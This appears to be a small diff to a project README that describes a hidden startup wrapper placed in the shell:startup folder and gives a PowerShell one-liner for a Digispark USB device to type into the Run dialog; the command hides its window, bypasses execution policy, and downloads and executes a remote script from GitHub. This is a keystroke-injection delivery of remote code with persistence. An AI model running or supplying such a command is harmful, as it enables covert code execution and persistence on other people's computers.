@@ -16,5 +16,3 @@ The intent is to create a startup wrapper, placing it in the shell:startup folde
 ---
 
 To run, just have a digispark run `powershell -W H -Ex B -c "iex (iwr 'https://github.com/Reginald-Gillespie/G/raw/main/i.ps1').Content"` in the Run Dialogue. Later I may make the initial script rerun the main script as a hidden window.
-
-Digispark code will be uploaded shortly.
